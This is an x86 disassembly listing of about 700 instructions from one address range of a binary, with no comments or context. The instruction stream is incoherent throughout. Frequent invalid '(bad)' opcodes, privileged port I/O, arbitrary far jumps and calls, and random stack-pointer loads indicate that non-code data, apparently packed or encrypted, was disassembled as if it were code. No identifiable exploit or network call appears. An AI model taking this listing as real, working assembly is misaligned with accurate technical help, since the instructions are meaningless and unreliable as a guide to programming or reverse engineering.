  40894d:	retf   
  40894e:	sub    BYTE PTR [esi+0x52],dh
  408951:	prefetcht1 BYTE PTR [ebx-0x38c99fbf]
  408958:	jmp    0xebe60a7e
  40895d:	popa   
  40895e:	mov    dl,0x3a
  408960:	pusha  
  408961:	mov    ah,0x83
  408963:	push   edi
  408964:	out    dx,al
  408965:	and    eax,0x8a897e02
  40896a:	ins    DWORD PTR es:[edi],dx
  40896b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40896c:	cmp    BYTE PTR ds:0x8777f7c5,bh
  408972:	mov    eax,0x3dab3b78
  408977:	mov    edi,DWORD PTR [ebp-0xc1caf5c]
  40897d:	into   
  40897e:	mov    WORD PTR [eax-0x4c6eae54],?
  408984:	in     al,dx
  408985:	and    BYTE PTR [esi-0x4c],cl
  408988:	xchg   esp,eax
  408989:	xchg   esp,eax
  40898a:	mov    ch,0x10
  40898c:	xchg   edx,eax
  40898d:	fisttp DWORD PTR [esi+0x76]
  408990:	or     al,0x54
  408992:	lea    eax,[edi-0x9633a0e]
  408998:	mov    ebx,0xae9d8957
  40899d:	push   ds
  40899e:	scas   al,BYTE PTR es:[edi]
  40899f:	jmp    0x67ef:0x6e29627d
  4089a6:	xor    al,0xf4
  4089a8:	cmp    DWORD PTR [eax+0x4f],ecx
  4089ab:	mov    DWORD PTR [ecx-0x3af70610],edi
  4089b1:	sub    DWORD PTR [edx+0x7],0x6d
  4089b5:	xchg   BYTE PTR [ecx+0x7a],bh
  4089b8:	outs   dx,DWORD PTR ds:[esi]
  4089b9:	adc    ah,bl
  4089bb:	mov    eax,ds:0x528ff3fa
  4089c0:	sub    DWORD PTR [ecx-0x6e9d0da9],0x7d796662
  4089ca:	xor    DWORD PTR [edi+edx*1],ebx
  4089cd:	and    eax,0xaf6abb55
  4089d2:	outs   dx,BYTE PTR ds:[esi]
  4089d3:	jnp    0x408a35
  4089d5:	mov    eax,ds:0x37ecfc79
  4089da:	nop
  4089db:	mov    BYTE PTR [esi],dh
  4089dd:	mov    ss,WORD PTR [edx]
  4089df:	mov    ecx,0x7ea60a90
  4089e4:	ret    
  4089e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089e6:	mov    esp,0x893ba7fc
  4089eb:	pop    eax
  4089ec:	jl     0x4089da
  4089ee:	dec    esi
  4089ef:	loop   0x408971
  4089f1:	daa    
  4089f2:	lea    esp,[esi-0x75]
  4089f5:	out    0xcb,eax
  4089f7:	sahf   
  4089f8:	or     eax,0xd57f51ee
  4089fd:	jns    0x408a71
  4089ff:	test   BYTE PTR [edx],bh
  408a01:	sbb    DWORD PTR [eax+0x54],0xa368187c
  408a08:	dec    esp
  408a09:	ret    0xfbde
  408a0c:	jb     0x408a1b
  408a0e:	xor    eax,0xbe71ab67
  408a13:	xchg   ebp,eax
  408a14:	mov    ebp,0x49a3c3fb
  408a19:	jo     0x4089fc
  408a1b:	nop
  408a1c:	jne    0x4089bb
  408a1e:	inc    edi
  408a1f:	ror    DWORD PTR [edi],0xdb
  408a22:	sbb    DWORD PTR [edi],ebx
  408a24:	sub    BYTE PTR [ebx],dl
  408a26:	or     BYTE PTR [ebp+0x4c91d03f],dl
  408a2c:	sub    al,0x8d
  408a2e:	inc    esp
  408a2f:	fmul   st(7),st
  408a31:	scas   al,BYTE PTR es:[edi]
  408a32:	mov    ebp,0x301dae29
  408a37:	inc    ecx
  408a38:	push   cs
  408a39:	shr    BYTE PTR ds:0x2cd87e1b,cl
  408a3f:	(bad)  
  408a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a42:	add    BYTE PTR [eax+0x27],al
  408a45:	cmp    DWORD PTR [ebx-0x1db598ec],0x813066ae
  408a4f:	cmp    ecx,edx
  408a51:	or     ebx,ebx
  408a53:	jb     0x4089ff
  408a55:	pop    ebx
  408a56:	retf   0x1eac
  408a59:	pop    ss
  408a5a:	push   edi
  408a5b:	dec    eax
  408a5c:	or     ch,dl
  408a5e:	div    BYTE PTR [ebp+0x14]
  408a61:	pushf  
  408a62:	or     eax,0xef2ac76c
  408a67:	enter  0xcb9,0x30
  408a6b:	jl     0x408aab
  408a6d:	jg     0x408a32
  408a6f:	adc    bh,BYTE PTR [esi+ebx*4+0xcae5946]
  408a76:	sub    bh,cl
  408a78:	(bad)  fs:[ecx-0x2fb9db0f]
  408a7f:	and    eax,0x6415c3cf
  408a84:	out    dx,al
  408a85:	push   cs
  408a86:	xchg   ecx,eax
  408a87:	jae    0x408a2b
  408a89:	mov    al,ds:0xe7a3b8f5
  408a8e:	or     BYTE PTR [edx+0x6d],cl
  408a91:	pop    ebp
  408a92:	mov    esi,0x9162e4e3
  408a97:	sub    bl,BYTE PTR [edi+0x62e15335]
  408a9d:	(bad)  [edi+0x5d]
  408aa0:	clc    
  408aa1:	loope  0x408aab
  408aa3:	out    0xa8,eax
  408aa5:	ror    BYTE PTR [eax],0xba
  408aa8:	fwait
  408aa9:	pmaxub mm0,QWORD PTR [ecx]
  408aac:	xchg   esp,eax
  408aad:	test   DWORD PTR [ebx-0x58],ecx
  408ab0:	xor    eax,0x3e93dc42
  408ab5:	mov    cl,0xe0
  408ab7:	ds dec edx
  408ab9:	sahf   
  408aba:	das    
  408abb:	push   ecx
  408abc:	mov    esi,0x7559013a
  408ac1:	jae    0x408b0a
  408ac3:	or     esi,DWORD PTR [ebx]
  408ac5:	mov    ecx,0x5b316fa5
  408aca:	xchg   ebp,eax
  408acb:	shr    BYTE PTR [esi+eax*8],cl
  408ace:	repnz add DWORD PTR [edx-0xcb6840b],ebx
  408ad5:	adc    dh,dh
  408ad7:	(bad)  [edx-0x80]
  408ada:	add    al,bl
  408adc:	inc    ecx
  408add:	xor    BYTE PTR [edi-0x66],bh
  408ae0:	gs jnp 0x408af9
  408ae3:	shr    ebx,cl
  408ae5:	lahf   
  408ae6:	mov    esi,0xba2bde8d
  408aeb:	inc    ebx
  408aec:	sub    dl,BYTE PTR [edx+esi*8-0x4b]
  408af0:	pop    ebp
  408af1:	int3   
  408af2:	shl    DWORD PTR [eax-0x65],1
  408af5:	mov    edx,0x7b750bf
  408afa:	(bad)  
  408afb:	sbb    ebp,DWORD PTR [edx-0x166130e2]
  408b01:	data16 or al,0x2d
  408b04:	jge    0x408acb
  408b06:	test   BYTE PTR [esi-0x5f],dl
  408b09:	cli    
  408b0a:	cmp    edx,edx
  408b0c:	push   0xfdbee519
  408b11:	call   0x24e65d46
  408b16:	mov    ch,0xcf
  408b18:	sub    BYTE PTR [ebx-0x728f1fa7],ah
  408b1e:	div    DWORD PTR [esp+eax*8]
  408b21:	xchg   ebp,eax
  408b22:	sub    bh,al
  408b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b25:	cmp    BYTE PTR ds:0x2d8d73eb,ah
  408b2b:	sbb    DWORD PTR [edi+0x55be3c63],edi
  408b31:	(bad)  
  408b32:	aad    0xf8
  408b34:	loopne 0x408aeb
  408b36:	clc    
  408b37:	enter  0x222,0x28
  408b3b:	stc    
  408b3c:	inc    esp
  408b3d:	nop
  408b3e:	cmp    eax,0xd6c4f528
  408b43:	mov    ds:0x4965e1e0,eax
  408b48:	add    bl,BYTE PTR [esi+0x5e]
  408b4b:	mov    edx,0xa75feb8a
  408b50:	mov    BYTE PTR [ebx],0xe5
  408b53:	aam    0x24
  408b55:	xor    dl,BYTE PTR [edi-0x2be60a28]
  408b5b:	xor    ebp,DWORD PTR fs:[ecx-0x2fb21d8]
  408b62:	and    BYTE PTR [eax],0x43
  408b65:	fidiv  WORD PTR [ebp+ecx*4-0x56976f2e]
  408b6c:	cmp    al,0x84
  408b6e:	xchg   ebp,eax
  408b6f:	mov    ds:0x8d9235bb,eax
  408b74:	fucomi st,st(2)
  408b76:	xchg   edx,eax
  408b77:	in     eax,dx
  408b78:	jae    0x408ba3
  408b7a:	jbe    0x408bac
  408b7c:	scas   al,BYTE PTR es:[edi]
  408b7d:	scas   eax,DWORD PTR es:[edi]
  408b7e:	mov    eax,DWORD PTR gs:[ebx-0x615e2de5]
  408b85:	loop   0x408b14
  408b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b88:	call   0x7894:0x35b18cc9
  408b8f:	inc    edi
  408b90:	repz lock cmp al,BYTE PTR [eax-0x5f2e0f1]
  408b98:	inc    ecx
  408b99:	xchg   ecx,eax
  408b9a:	aam    0xbb
  408b9c:	aad    0x4f
  408b9e:	sub    DWORD PTR [esi],0x6d0cd2ba
  408ba4:	ins    BYTE PTR es:[edi],dx
  408ba5:	inc    eax
  408ba6:	push   0x7c737dee
  408bab:	dec    esp
  408bac:	push   0x9472fa2e
  408bb1:	test   al,0x32
  408bb3:	dec    esp
  408bb4:	(bad)  
  408bb5:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bb7:	or     ebp,ebp
  408bb9:	sub    edx,DWORD PTR [edi+0x16]
  408bbc:	pop    edi
  408bbd:	lds    eax,FWORD PTR [edx]
  408bbf:	mov    ebx,0x2d3520dd
  408bc4:	xor    ebp,eax
  408bc6:	pop    ebx
  408bc7:	push   ecx
  408bc8:	dec    DWORD PTR [edi-0x5b]
  408bcb:	fmul   QWORD PTR [esi-0x71452b16]
  408bd1:	add    DWORD PTR [esi+0x148441c4],ebx
  408bd7:	dec    edi
  408bd8:	inc    dl
  408bda:	pop    ds
  408bdb:	(bad)  
  408bdc:	leave  
  408bdd:	push   ebx
  408bde:	push   ss
  408bdf:	inc    esi
  408be0:	sbb    edx,edi
  408be2:	inc    edi
  408be3:	jae    0x408bd6
  408be5:	jbe    0x408c2c
  408be7:	xchg   esp,eax
  408be8:	inc    ebx
  408be9:	stos   BYTE PTR es:[edi],al
  408bea:	mov    dl,0x79
  408bec:	cdq    
  408bed:	adc    ch,BYTE PTR [eax-0x72cb5cc9]
  408bf3:	inc    esi
  408bf4:	mov    bh,0xf3
  408bf6:	addr16 dec edi
  408bf8:	sub    al,0x73
  408bfa:	xor    eax,0xb667da4
  408bff:	(bad)  
  408c01:	in     eax,0x64
  408c03:	mov    edi,0x46fb5320
  408c08:	out    0xf9,al
  408c0a:	adc    al,0x27
  408c0c:	xor    al,0x13
  408c0e:	and    DWORD PTR [ebx],eax
  408c10:	add    eax,0xdb699ad1
  408c15:	push   0xffffff8a
  408c17:	jge    0x408bf4
  408c19:	daa    
  408c1a:	not    ebx
  408c1c:	test   eax,0x724ed955
  408c21:	push   es
  408c22:	cmp    DWORD PTR [ebx+0x31],edx
  408c25:	dec    edi
  408c26:	push   esp
  408c27:	shr    DWORD PTR [edi+0x46],cl
  408c2a:	loopne 0x408c0b
  408c2c:	sar    BYTE PTR [ecx-0x63],0xa9
  408c30:	push   edi
  408c31:	mov    ds:0x75216d64,al
  408c36:	mov    edx,0xd3ea2e95
  408c3b:	call   0x73df:0x7349bd3a
  408c42:	inc    ecx
  408c43:	(bad)  
  408c44:	xor    DWORD PTR ds:0x8f36d6e1,edi
  408c4a:	sti    
  408c4b:	push   esi
  408c4c:	rcr    DWORD PTR [eax+0x7e],cl
  408c4f:	pop    edi
  408c50:	adc    ah,bl
  408c52:	mov    cl,0x8
  408c54:	scas   eax,DWORD PTR es:[edi]
  408c55:	adc    eax,0x5fed7f94
  408c5a:	xor    eax,0xcb8d9f2c
  408c5f:	ficom  DWORD PTR [edi-0x50]
  408c62:	sbb    DWORD PTR [ebx-0x7b],ebp
  408c65:	(bad)  
  408c67:	popf   
  408c68:	stc    
  408c69:	add    DWORD PTR [esi],edi
  408c6b:	repz call FWORD PTR [eax+0x246a814f]
  408c72:	xor    DWORD PTR [esi-0x67b5ac09],edx
  408c78:	stc    
  408c79:	loopne 0x408c2d
  408c7b:	pop    ecx
  408c7c:	bndldx bnd0,[ecx+0x68a518fd]
  408c83:	clc    
  408c84:	(bad)  
  408c85:	clc    
  408c86:	jno    0x408c23
  408c88:	xor    DWORD PTR [ecx+eax*8+0x7460c2d1],ecx
  408c8f:	sbb    DWORD PTR [ecx],0xd91057ea
  408c95:	test   eax,0x9aa7e1cf
  408c9a:	dec    ecx
  408c9b:	cli    
  408c9c:	into   
  408c9d:	push   edx
  408c9e:	fmul   QWORD PTR [ecx+0x75ecaf5f]
  408ca4:	test   al,0xf3
  408ca6:	xchg   ecx,eax
  408ca7:	sub    eax,0x7a453771
  408cac:	or     BYTE PTR [edi],al
  408cae:	or     DWORD PTR [edx-0x8],ecx
  408cb1:	(bad)  
  408cb2:	mov    eax,ds:0xe4514482
  408cb7:	xor    al,0xb4
  408cb9:	jmp    0x408c92
  408cbb:	jecxz  0x408c63
  408cbd:	mov    DWORD PTR [ecx-0x2e],ebx
  408cc0:	out    0xf6,eax
  408cc2:	out    dx,eax
  408cc3:	mov    al,ds:0xee630160
  408cc8:	sub    dl,BYTE PTR [edi+0x2835b0d2]
  408cce:	(bad)  
  408ccf:	fld    DWORD PTR [ebx+0x3efffefd]
  408cd5:	add    eax,0x3ae045e5
  408cda:	adc    bh,BYTE PTR [edi+0x1a]
  408cdd:	int3   
  408cde:	int    0xa0
  408ce0:	inc    edi
  408ce1:	shl    DWORD PTR [edx],0xd8
  408ce4:	adc    eax,0xba3a00e3
  408ce9:	ja     0x408cf5
  408ceb:	mov    es,WORD PTR ds:0x4d29dd57
  408cf1:	mov    al,ds:0x7c28fa2e
  408cf6:	xor    dh,bl
  408cf8:	mov    bl,0x7f
  408cfa:	fdiv   DWORD PTR [ebp+edi*1-0x1e29e771]
  408d01:	jns    0x408c9c
  408d03:	xor    ebp,DWORD PTR [ebx]
  408d05:	xor    esi,esi
  408d07:	pop    esp
  408d08:	mov    ah,0xe3
  408d0a:	outs   dx,DWORD PTR ds:[esi]
  408d0b:	jae    0x408d0b
  408d0d:	mov    eax,ds:0x8ef92366
  408d12:	mov    dh,0x8a
  408d14:	sub    edi,ebx
  408d16:	rol    DWORD PTR [ebp+0x1b],1
  408d19:	(bad)  
  408d1a:	jno    0x408d8e
  408d1c:	jno    0x408d47
  408d1e:	jmp    0x9d0fbbb5
  408d23:	daa    
  408d24:	mov    eax,ds:0x984e3d5a
  408d29:	cmp    ebp,DWORD PTR [ecx]
  408d2b:	add    al,0x8f
  408d2d:	mov    ds:0xfdd717b3,eax
  408d32:	mov    bl,0x85
  408d34:	addr16 pop esi
  408d36:	shl    DWORD PTR [ecx+edx*2-0x44ca7b0d],cl
  408d3d:	shl    BYTE PTR [edx+0x56],cl
  408d40:	fsubr  QWORD PTR [ebx]
  408d42:	pop    ecx
  408d43:	adc    BYTE PTR [ecx],dl
  408d45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d46:	stos   BYTE PTR es:[edi],al
  408d47:	mov    ecx,0x8935afaf
  408d4c:	shr    BYTE PTR [esi],0x19
  408d4f:	jmp    0x408da7
  408d51:	sbb    eax,0xdbb14d52
  408d56:	cmp    BYTE PTR [edx],dl
  408d58:	inc    esi
  408d59:	push   ss
  408d5a:	leave  
  408d5b:	push   ss
  408d5c:	adc    BYTE PTR [eax+0x2312146a],0xbe
  408d63:	popf   
  408d64:	and    DWORD PTR [ecx-0x50dfad0b],esp
  408d6a:	dec    edx
  408d6b:	out    dx,al
  408d6c:	scas   al,BYTE PTR es:[edi]
  408d6d:	mov    BYTE PTR [ecx-0x15],dl
  408d70:	dec    eax
  408d71:	jns    0x408d5f
  408d73:	lods   al,BYTE PTR ds:[esi]
  408d74:	in     eax,0x67
  408d76:	lds    eax,FWORD PTR [esi-0x128614a6]
  408d7c:	(bad)  
  408d7d:	mov    dh,0x85
  408d7f:	mov    ecx,0x42cb619c
  408d84:	mov    ebx,0x162a82bb
  408d89:	sub    al,0x7a
  408d8b:	popa   
  408d8c:	cmp    DWORD PTR [edi+ebp*2+0x5],ebp
  408d90:	ret    0xe047
  408d93:	in     al,0x4a
  408d95:	shl    edi,0x10
  408d98:	cmc    
  408d99:	mov    WORD PTR [ebx],cs
  408d9b:	out    dx,al
  408d9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d9d:	or     DWORD PTR [edi-0x41],esp
  408da0:	adc    dh,BYTE PTR [esi]
  408da2:	adc    DWORD PTR [ecx-0x6b],0xde93884f
  408da9:	add    DWORD PTR [ebx+0x37],esp
  408dac:	mov    eax,ds:0x2c207217
  408db1:	cmp    eax,0x41edb878
  408db6:	sub    eax,0xb30a0677
  408dbb:	popf   
  408dbc:	sbb    eax,0xce79878d
  408dc1:	aad    0x4
  408dc3:	shl    bl,0x55
  408dc6:	sub    eax,0xf50bb633
  408dcb:	add    dh,BYTE PTR [edi+0x79]
  408dce:	scas   al,BYTE PTR es:[edi]
  408dcf:	sub    esp,ecx
  408dd1:	leave  
  408dd2:	loopne 0x408d6e
  408dd4:	loope  0x408e3b
  408dd6:	xchg   esi,eax
  408dd7:	inc    esp
  408dd8:	push   eax
  408dd9:	and    BYTE PTR [ebx+0x6f],0xd7
  408ddd:	in     eax,0xcd
  408ddf:	xchg   ebx,eax
  408de0:	sub    cl,BYTE PTR [edx-0x2ded43b4]
  408de6:	ins    BYTE PTR es:[edi],dx
  408de7:	sub    eax,0x294aa18b
  408dec:	stc    
  408ded:	sbb    esi,esp
  408def:	imul   eax,DWORD PTR [edx-0x2ebe7534],0x8ea2b08d
  408df9:	outs   dx,DWORD PTR ds:[esi]
  408dfa:	mov    ebx,0xd4218466
  408dff:	jmp    0x408e0d
  408e01:	outs   dx,DWORD PTR ds:[esi]
  408e02:	dec    esp
  408e03:	adc    al,0xe
  408e05:	xor    BYTE PTR [ebx+0x7a],dh
  408e08:	sub    DWORD PTR [ecx],esp
  408e0a:	mov    gs,WORD PTR [edx]
  408e0c:	and    eax,0x8ab77698
  408e11:	jecxz  0x408e2a
  408e13:	int3   
  408e14:	cwde   
  408e15:	hlt    
  408e16:	hlt    
  408e17:	mov    BYTE PTR [ebx],dh
  408e19:	int3   
  408e1a:	or     ebx,DWORD PTR [eax-0x30]
  408e1d:	in     eax,dx
  408e1e:	jbe    0x408e05
  408e20:	pop    ecx
  408e21:	(bad)  
  408e23:	mov    eax,ds:0xc1383ef3
  408e28:	cmp    al,BYTE PTR [esi+0x4c8b24b8]
  408e2e:	pop    esi
  408e2f:	push   ss
  408e30:	sub    al,0xb7
  408e32:	xor    al,0x47
  408e34:	adc    BYTE PTR [ebx],cl
  408e36:	and    eax,0x823b12c4
  408e3b:	retf   0x468f
  408e3e:	jmp    0xa22:0x22676d9f
  408e45:	aam    0xa7
  408e47:	in     eax,0x8a
  408e49:	pop    esi
  408e4a:	ret    0xe910
  408e4d:	mov    ch,0x6b
  408e4f:	pop    esi
  408e50:	push   eax
  408e51:	mov    ah,BYTE PTR [ebp+0x3de38494]
  408e57:	pop    ecx
  408e58:	pop    esp
  408e59:	mov    ah,0x55
  408e5b:	dec    esp
  408e5c:	aam    0xb7
  408e5e:	cs pop esi
  408e60:	add    al,0x7d
  408e62:	loope  0x408e68
  408e64:	(bad)  
  408e65:	xchg   ebp,eax
  408e66:	mov    ebx,0xab7a28c4
  408e6b:	cdq    
  408e6c:	call   0x263ad6
  408e71:	ins    BYTE PTR es:[edi],dx
  408e72:	dec    ebx
  408e73:	imul   ebp,DWORD PTR [ebp+0x607fc982],0xffffff91
  408e7a:	(bad)  
  408e7b:	cmp    al,0x5e
  408e7d:	(bad)  [eax-0x66]
  408e80:	loop   0x408e11
  408e82:	fsubr  DWORD PTR [eax]
  408e84:	jmp    0x408e3a
  408e86:	adc    eax,DWORD PTR ds:0x2df8d30f
  408e8c:	mov    ebp,0x802c9211
  408e91:	pop    DWORD PTR [esi-0x4b]
  408e94:	outs   dx,DWORD PTR ds:[esi]
  408e95:	sbb    eax,esp
  408e97:	push   ebx
  408e98:	push   edx
  408e99:	ins    DWORD PTR es:[edi],dx
  408e9a:	sbb    BYTE PTR [eax],0xeb
  408e9d:	mov    edx,0xe14806ee
  408ea2:	inc    esi
  408ea3:	cmp    eax,0x21fdac37
  408ea8:	data16 mov bh,0xcf
  408eab:	shl    DWORD PTR [esi],cl
  408ead:	shr    DWORD PTR [ebx+0x7],1
  408eb0:	sub    BYTE PTR ds:[edx-0x2d],bl
  408eb4:	mov    edi,0xfdc5c746
  408eb9:	stc    
  408eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ebb:	or     cl,BYTE PTR [edx+0x4c]
  408ebe:	sub    eax,DWORD PTR [eax-0x298c3078]
  408ec4:	fnstsw WORD PTR [esi+ebx*4+0x69c69fea]
  408ecb:	jo     0x408e77
  408ecd:	loope  0x408f41
  408ecf:	adc    eax,0x3bd67c38
  408ed4:	(bad)  
  408ed5:	idiv   esi
  408ed7:	shl    DWORD PTR [ebp-0x65],cl
  408eda:	les    ebp,FWORD PTR [edi+eax*8-0x11262ac9]
  408ee1:	jae    0x408ec2
  408ee3:	add    al,0xc2
  408ee5:	lock pop edx
  408ee7:	imul   edx,edx,0xb5911ae0
  408eed:	popa   
  408eee:	out    0xe2,al
  408ef0:	test   BYTE PTR [esi+0x104adccb],cl
  408ef6:	sahf   
  408ef7:	pusha  
  408ef8:	mov    ds:0x40e62eb0,al
  408efd:	imul   ebx,DWORD PTR [ecx],0xffffffad
  408f00:	push   es
  408f01:	bswap  eax
  408f03:	mov    bl,0x7d
  408f05:	out    dx,eax
  408f06:	imul   esi,DWORD PTR [ebx+0x21],0xffffffab
  408f0a:	push   ebx
  408f0b:	sub    ch,BYTE PTR [edi]
  408f0d:	push   eax
  408f0e:	mov    DWORD PTR [ecx+0xe],esi
  408f11:	jbe    0x408f61
  408f13:	jecxz  0x408f41
  408f15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f16:	xor    BYTE PTR [esi-0x30],0xb8
  408f1a:	jmp    0x663ea2c
  408f1f:	inc    esp
  408f20:	mov    bh,0xe2
  408f22:	(bad)  
  408f23:	cmp    BYTE PTR [esi-0x4d],dl
  408f26:	clc    
  408f27:	cli    
  408f28:	add    eax,0xb28d81f5
  408f2d:	inc    ecx
  408f2e:	mov    es,WORD PTR [ebp+0x2c968635]
  408f34:	ror    esi,cl
  408f36:	adc    esi,DWORD PTR [edx-0x6f]
  408f39:	iret   
  408f3a:	jp     0x408efd
  408f3c:	xor    al,0x1d
  408f3e:	into   
  408f3f:	out    dx,eax
  408f40:	jle    0x408fb8
  408f42:	xchg   ecx,eax
  408f43:	xchg   esi,eax
  408f44:	jecxz  0x408f0b
  408f46:	dec    esi
  408f47:	or     ebx,DWORD PTR [ebp-0x12]
  408f4a:	popa   
  408f4b:	call   0x442e:0x3da398bb
  408f52:	jb     0x408eef
  408f54:	pop    ss
  408f55:	shl    DWORD PTR [ebp+0x41],cl
  408f58:	sub    al,0xfd
  408f5a:	jns    0x408f90
  408f5c:	or     esi,DWORD PTR [edx-0x2a]
  408f5f:	inc    eax
  408f60:	pop    es
  408f61:	sbb    DWORD PTR [esi+edx*4+0x57],0x416347bb
  408f69:	call   0x8d102116
  408f6e:	adc    DWORD PTR [ecx],ebx
  408f70:	(bad)  
  408f71:	sbb    BYTE PTR [ebp+0x2685dacc],al
  408f77:	mov    ch,0xf5
  408f79:	in     eax,dx
  408f7a:	cmp    al,0x31
  408f7c:	cmc    
  408f7d:	stc    
  408f7e:	rol    BYTE PTR [ebp+0x8],1
  408f81:	not    DWORD PTR [ebx+ebx*2]
  408f84:	int3   
  408f85:	or     al,0x95
  408f87:	sub    DWORD PTR [eax-0x7c33998e],ebp
  408f8d:	adc    ch,BYTE PTR [edx*2-0x2db539ac]
  408f94:	mov    WORD PTR [ecx-0x56381265],gs
  408f9a:	mov    ah,0xf1
  408f9c:	adc    al,0x3
  408f9e:	lods   al,BYTE PTR ds:[esi]
  408f9f:	fwait
  408fa0:	and    BYTE PTR [eax-0x4],dh
  408fa3:	and    al,0x43
  408fa5:	mov    edi,0xe7ed3646
  408faa:	mov    ah,0xc3
  408fac:	jmp    0xeba7:0xde88a967
  408fb3:	sbb    dl,bl
  408fb5:	or     dl,BYTE PTR [edi]
  408fb7:	mov    cl,0xbb
  408fb9:	and    eax,0x4db1cf5b
  408fbe:	push   esp
  408fbf:	and    eax,0xb5bc352d
  408fc4:	addr16 loopne 0x408ff9
  408fc7:	lods   al,BYTE PTR ds:[esi]
  408fc8:	add    BYTE PTR [esi-0x7fbfa523],cl
  408fce:	rol    DWORD PTR [eax+0x44],0x3a
  408fd2:	shl    DWORD PTR [esi+0x69d42271],0xd4
  408fd9:	clc    
  408fda:	imul   esp,DWORD PTR [esi-0x48c97927],0x4e925713
  408fe4:	xchg   dh,dl
  408fe6:	repnz xor ebp,DWORD PTR [ecx+ebp*1-0xe]
  408feb:	xchg   BYTE PTR [eax-0x4177ee5],dl
  408ff1:	pop    es
  408ff2:	adc    ebp,DWORD PTR [esi+edi*8+0x5]
  408ff6:	mov    ebp,0x734d460
  408ffb:	inc    ah
  408ffd:	iret   
  408ffe:	mov    BYTE PTR [eax+0x8],al
  409001:	js     0x408f86
  409003:	shr    BYTE PTR [edx],1
  409005:	inc    esp
  409006:	ins    DWORD PTR es:[edi],dx
  409007:	push   edi
  409008:	xchg   esp,eax
  409009:	add    al,bh
  40900b:	xchg   esp,eax
  40900c:	mov    al,ds:0xa90cb180
  409011:	and    ah,BYTE PTR [esi+0x31dd6e84]
  409017:	dec    esi
  409018:	jb     0x409004
  40901a:	push   cs
  40901b:	mov    ds,WORD PTR [esi]
  40901d:	sub    DWORD PTR [esi],edx
  40901f:	xor    DWORD PTR [eax],ebp
  409021:	leave  
  409022:	adc    dl,BYTE PTR [ecx+0x76b8a7c0]
  409028:	push   0x4f5644a2
  40902d:	sahf   
  40902e:	and    ch,ch
  409030:	pop    ecx
  409031:	inc    edi
  409032:	adc    BYTE PTR [ebx-0x39],al
  409035:	imul   ecx,DWORD PTR [esi-0x1e],0xffffff93
  409039:	sub    al,ch
  40903b:	mov    al,0x38
  40903d:	sub    eax,0x8efc534f
  409042:	mov    dh,0xf
  409044:	fwait
  409045:	xlat   BYTE PTR ds:[ebx]
  409046:	or     al,0xbf
  409048:	and    BYTE PTR [ebp-0x41728f0e],dl
  40904e:	mov    bh,0x89
  409050:	shl    bl,0x2c
  409053:	or     DWORD PTR [esi+0x23],edi
  409056:	fisttp DWORD PTR [eax+eax*1]
  409059:	xchg   edi,eax
  40905a:	sbb    ch,bh
  40905c:	add    BYTE PTR [ecx],ch
  40905e:	cmp    DWORD PTR [ecx-0xf124567],eax
  409064:	scas   eax,DWORD PTR es:[edi]
  409065:	jmp    0x409042
  409067:	pop    ds
  409068:	iret   
  409069:	push   esp
  40906a:	xor    edx,DWORD PTR [ecx-0x27]
  40906d:	push   ebx
  40906e:	icebp  
  40906f:	pusha  
  409070:	jmp    FWORD PTR [edx-0x32]
  409073:	cmp    bl,0xd4
  409076:	mov    ecx,DWORD PTR [eax-0x6309f0ec]
  40907c:	push   esp
  40907d:	pop    ebx
  40907e:	mov    cl,0x9f
  409080:	dec    esp
  409081:	leave  
  409082:	fisubr WORD PTR [eax+0x42ef68c1]
  409088:	adc    eax,0x7220134f
  40908d:	add    eax,0x9a8b890b
  409092:	push   esi
  409093:	stos   DWORD PTR es:[edi],eax
  409094:	pusha  
  409095:	scas   al,BYTE PTR es:[edi]
  409096:	pop    ebx
  409097:	aad    0xe1
  409099:	into   
  40909a:	pop    ebx
  40909b:	ja     0x409088
  40909d:	and    eax,0x2de5e598
  4090a2:	lods   al,BYTE PTR ds:[esi]
  4090a3:	xchg   ecx,eax
  4090a4:	or     BYTE PTR [edx],dh
  4090a6:	push   esi
  4090a7:	mov    ds:0x5ef8fc69,al
  4090ac:	xchg   edx,eax
  4090ad:	jmp    0x4090e0
  4090af:	dec    ebp
  4090b0:	xor    al,BYTE PTR [edi]
  4090b2:	lds    ebp,FWORD PTR [esi]
  4090b4:	jmp    0x41bf490a
  4090b9:	test   al,0xc0
  4090bb:	inc    ecx
  4090bc:	mov    eax,0x1d968827
  4090c1:	outs   dx,DWORD PTR ds:[esi]
  4090c2:	fsubr  st,st(4)
  4090c4:	mov    edx,0x18ce1b85
  4090c9:	push   ecx
  4090ca:	addr16 cdq 
  4090cc:	ds cmp eax,0xab57d9e8
  4090d2:	mov    eax,0x866c6da0
  4090d7:	or     ch,bl
  4090d9:	popa   
  4090da:	sub    BYTE PTR [ebx+0x77],0xcf
  4090de:	push   0x114e2f1b
  4090e3:	rcr    DWORD PTR [ebx],cl
  4090e5:	xlat   BYTE PTR ds:[ebx]
  4090e6:	mov    edx,0x215f22de
  4090eb:	cmp    DWORD PTR [edx+0x5d],0x122fcc9b
  4090f2:	cmc    
  4090f3:	dec    esi
  4090f4:	sub    bh,cl
  4090f6:	pop    esp
  4090f7:	sub    eax,edx
  4090f9:	push   ebp
  4090fa:	sbb    al,0xcc
  4090fc:	lods   al,BYTE PTR ds:[esi]
  4090fd:	sahf   
  4090fe:	xchg   edx,eax
  4090ff:	mov    edx,0x347af42f
  409104:	retf   
  409105:	jmp    0x26b4:0xdb88103f
  40910c:	or     DWORD PTR [ebp+0x5b],esp
  40910f:	add    al,0xe8
  409111:	xor    cl,BYTE PTR [edi]
  409113:	div    DWORD PTR ds:0xecb261dc
  409119:	jmp    0xcfa5712b
  40911e:	out    0xfd,ax
  409121:	push   es
  409122:	jmp    0xf8f:0x5581081f
  409129:	ficom  WORD PTR [ecx-0x23]
  40912c:	cmp    eax,0x53b320c2
  409131:	mov    ah,0xa4
  409133:	xchg   edx,eax
  409134:	or     al,0x42
  409136:	mov    eax,ds:0xce62be23
  40913b:	mov    esp,0x40668af
  409140:	or     ch,BYTE PTR [ebp+0x8444e80]
  409146:	push   edx
  409147:	pop    ss
  409148:	mov    bl,0x68
  40914a:	call   0x961f:0xad1c84f8
  409151:	es push 0xba47f20
